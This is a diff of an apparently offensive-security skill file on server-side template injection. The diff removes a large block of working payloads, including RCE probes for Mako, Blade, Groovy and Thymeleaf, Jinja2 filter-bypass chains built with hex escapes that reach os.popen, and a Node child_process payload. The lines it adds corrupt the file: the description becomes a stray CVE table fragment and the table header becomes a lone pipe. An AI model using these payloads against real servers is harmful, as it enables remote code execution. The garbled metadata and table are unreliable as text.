@@ -1,73 +1,10 @@
 ---
 name: offensive-ssti
-description: Template engines are software used to generate dynamic web pages. When user input is unsafely embedded into templates, server-side template injection (SSTI) can occur, potentially leading to Remote Code Execution (RCE).
+description: "| | CVE‑2024‑22195 | Jinja2 sandbox / `xmlattr` filter bypass    | High     | 3."
 domain: cybersecurity
 ---
------------------------------ | --------------------------------------------------- | ----------------------------------------------------------------- |
-| **Mako** (Python/Pyramid)        | Error message containing `mako.exceptions`          | `${self.module.os.popen('id').read()}`                            |
-| **Blade** (Laravel 11)           | `Undefined variable` or `@dd($loop)` dumps          | `{!!\\Illuminate\\Support\\Facades\\Artisan::call('about')!!}`    |
-| **Groovy / GSP**                 | Stack trace with `groovy.text.SimpleTemplateEngine` | `<% Class.forName('java.lang.Runtime').runtime.exec('id') %>`     |
-| **Tera / Askama (Rust)**         | Files ending `.tera` / `.askama.rs`                 | No generic RCE yet; watch for logic injection                     |
-| **EJS / Pug (Node)**             | `.ejs`, `.pug` templates                            | Often needs gadget via helpers/filters; prototype chains          |
-| **Twig (PHP)**                   | Error mentions `Twig\\`                             | `{% for k,v in _self %}` info, RCE via unsafe extensions          |
-| **Liquid** (Shopify/Ruby)        | `{{product.title}}`, errors mention `Liquid::`      | Limited by default; see Liquid-specific payloads below            |
-| **Nunjucks** (Node/Mozilla)      | Mozilla's Jinja2 port, `.njk` templates             | Prototype chain to `Function` or `require`                        |
-| **Handlebars** (Node)            | `{{this}}`, `{{@root}}` work                        | Limited RCE; requires unsafe helpers or prototype pollution       |
-| **Thymeleaf 3.1+** (Java/Spring) | `th:text="${...}"`, Spring Boot stack traces        | `${T(java.lang.Runtime).getRuntime().exec('id')}` if SpEL enabled |
 
-#### Variable Probing
-
-Try injecting known variables for common frameworks: `{{config}}`, `{{settings}}`, `{{app.request.server.all|join(',')}}`, `{$smarty.version}`.
-
-## Bypass Techniques
-
-### Character Blacklist Bypass
-
-- Use alternative syntax: `getattr(object, 'attribute')` instead of `object.attribute`. Use `{{request|attr('application')}}` instead of `{{request.application}}`.
-- Use array/dictionary access: `request['application']` instead of `request.application`.
-- Hex/Octal Encoding (if interpreted server-side): `request['\x5f\x5fglobals\x5f\x5f']` instead of `request['__globals__']`.
-  ```python
-  # Example: Bypass '.' and '_' using brackets and hex
-  {{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
-  # Example: Using attr() and hex (Source: HackTricks)
-  {%raw %}{% with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()%}{{a}}{% endwith %}{% endraw %}
-  ```
-- URL Parameter manipulation (Source: HackTricks):
-  - Pass attribute name: `?c=__class__` -> `{{ request|attr(request.args.c) }}`
-  - Construct attribute name: `?f=%s%sclass%s%s&a=_` -> `{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}`
-  - List join: `?l=a&a=_&a=_&a=class&a=_&a=_` -> `{{ request|attr(request.args.getlist(request.args.l)|join) }}`
-
-> **Note:** The index for `subprocess.Popen` differs between CPython 3.11 and 3.12; enumerate `__subclasses__()` at runtime instead of hard‑coding.
-
-### Keyword Filtering Bypass
-
-- Concatenation: `'os'.__class__` -> `'o'+'s'`
-- Using `request` object attributes or environment variables if keywords like `import` or `os` are blocked.
-- Jinja2 Context Variables: Access `os` via `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}` or similar paths ([Source: Podalirius](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/)).
-
-### NET Reflection
-
-Use reflection to load assemblies or invoke methods indirectly.
-On modern ASP.NET Core, Razor limits direct process start; look for misused `Html.Raw`, custom tag helpers, or debug compilation flags.
-
-### String-less Exploitation
-
-Modern WAFs often filter quotes and common keyword tokens. 2025 research showed how to build strings from arithmetic or list indices.
-
-```jinja
-{{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}
-```
-
-For Node templating (EJS/Pug/Handlebars server-side), prefer prototype traversal to reach `Function` or `require` when helpers expose evaluation sinks:
-
-```js
-<%=(global.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')())%>
-```
-
-### Recent CVEs (2024‑2025)
-
-| CVE            | Affected component                          | Severity | Fixed in              |
-| -------------- | ------------------------------------------- | -------- | --------------------- |
+|
 | CVE‑2024‑22195 | Jinja2 sandbox / `xmlattr` filter bypass    | High     | 3.1.3                 |
 | CVE‑2024‑46507 | Yeti threat‑intel platform SSTI → RCE       | Critical | 1.6.2                 |
 | Various (2024) | Atlassian Confluence widgets, CrushFTP, HFS | Critical | See vendor advisories |
